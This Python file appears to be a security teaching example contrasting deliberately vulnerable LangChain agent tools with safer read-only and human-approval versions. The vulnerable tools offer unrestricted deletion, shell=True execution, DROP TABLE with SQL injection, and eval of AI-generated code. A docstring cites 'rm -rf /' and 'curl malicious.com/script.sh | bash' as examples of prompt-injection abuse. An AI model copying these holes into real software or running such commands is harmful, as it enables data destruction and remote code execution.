"""
Example 3: Over-Privileged AI Tools Vulnerabilities
This file contains intentional security vulnerabilities for demonstration purposes.
DO NOT USE THIS CODE IN PRODUCTION!
"""

import os
import subprocess
import shutil
from langchain.agents import initialize_agent, Tool
from langchain.llms import OpenAI


# VULNERABLE: Dangerous file deletion tool
def delete_file_tool(file_path: str) -> str:
    """
    DANGEROUS: AI agent can delete any file
    If prompt injection occurs, attacker could delete critical files
    """
    try:
        os.remove(file_path)
        return f"File {file_path} deleted successfully"
    except Exception as e:
        return f"Error deleting file: {e}"


def delete_directory_tool(dir_path: str) -> str:
    """
    DANGEROUS: AI agent can delete entire directories
    """
    try:
        shutil.rmtree(dir_path)
        return f"Directory {dir_path} deleted successfully"
    except Exception as e:
        return f"Error deleting directory: {e}"


def execute_command_tool(command: str) -> str:
    """
    EXTREMELY DANGEROUS: AI agent can execute arbitrary system commands
    An attacker could run: "rm -rf /" or "curl malicious.com/script.sh | bash"
    """
    try:
        result = subprocess.run(
            command,
            shell=True,  # VERY DANGEROUS!
            capture_output=True,
            text=True
        )
        return result.stdout
    except Exception as e:
        return f"Error executing command: {e}"


def drop_database_table(table_name: str) -> str:
    """
    DANGEROUS: AI agent can drop database tables
    """
    import psycopg2
    
    conn = psycopg2.connect("postgresql://localhost/mydb")
    cursor = conn.cursor()
    
    # BAD: No validation, direct SQL execution
    cursor.execute(f"DROP TABLE {table_name}")
    conn.commit()
    
    return f"Table {table_name} dropped"


# VULNERABLE: AI Agent with excessive permissions
def create_overprivileged_agent():
    """
    VULNERABLE: Agent has delete, execute, and drop permissions
    If an attacker achieves prompt injection, they could:
    - Delete critical files
    - Execute malicious commands
    - Drop database tables
    """
    llm = OpenAI(temperature=0)
    
    # BAD: Giving AI agent dangerous tools
    tools = [
        Tool(
            name="delete_file",
            func=delete_file_tool,
            description="Delete a file from the system"
        ),
        Tool(
            name="delete_directory",
            func=delete_directory_tool,
            description="Delete an entire directory"
        ),
        Tool(
            name="execute_command",
            func=execute_command_tool,
            description="Execute a system command"
        ),
        Tool(
            name="drop_table",
            func=drop_database_table,
            description="Drop a database table"
        )
    ]
    
    # Create agent with dangerous tools
    agent = initialize_agent(
        tools=tools,
        llm=llm,
        agent="zero-shot-react-description",
        verbose=True
    )
    
    return agent


# VULNERABLE: Using eval/exec with AI-generated code
def execute_ai_code(code_string: str):
    """
    EXTREMELY DANGEROUS: Executing AI-generated code
    An attacker could inject malicious code through prompt injection
    """
    # BAD: Never use eval/exec with untrusted input
    result = eval(code_string)
    return result


# SAFE ALTERNATIVES (for comparison):
def read_file_tool(file_path: str) -> str:
    """
    SAFE: Read-only operation
    """
    try:
        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        return f"Error reading file: {e}"


def search_files_tool(query: str) -> str:
    """
    SAFE: Search operation (read-only)
    """
    # Implementation would search files without modifying them
    return f"Search results for: {query}"


def create_safe_agent():
    """
    SAFE: Agent with read-only permissions
    Follows principle of least privilege
    """
    llm = OpenAI(temperature=0)
    
    # GOOD: Only read-only tools
    tools = [
        Tool(
            name="read_file",
            func=read_file_tool,
            description="Read contents of a file (read-only)"
        ),
        Tool(
            name="search_files",
            func=search_files_tool,
            description="Search for files (read-only)"
        )
    ]
    
    agent = initialize_agent(
        tools=tools,
        llm=llm,
        agent="zero-shot-react-description",
        verbose=True
    )
    
    return agent


def create_safe_agent_with_approval():
    """
    SAFE: Agent with human-in-the-loop approval for dangerous operations
    """
    def delete_with_approval(file_path: str) -> str:
        """
        Requires human approval before deletion
        """
        print(f"AI agent requests to delete: {file_path}")
        approval = input("Approve deletion? (yes/no): ")
        
        if approval.lower() == 'yes':
            os.remove(file_path)
            return f"File {file_path} deleted with approval"
        else:
            return "Deletion not approved"
    
    llm = OpenAI(temperature=0)
    
    # GOOD: Dangerous operations require approval
    tools = [
        Tool(
            name="read_file",
            func=read_file_tool,
            description="Read a file"
        ),
        Tool(
            name="delete_file_with_approval",
            func=delete_with_approval,
            description="Request to delete a file (requires human approval)"
        )
    ]
    
    agent = initialize_agent(
        tools=tools,
        llm=llm,
        agent="zero-shot-react-description",
        verbose=True
    )
    
    return agent


if __name__ == "__main__":
    print("This file demonstrates over-privileged AI tool vulnerabilities.")
    print("AI agents should follow the principle of least privilege!")
    print("Consider implementing human-in-the-loop approval for dangerous operations.")

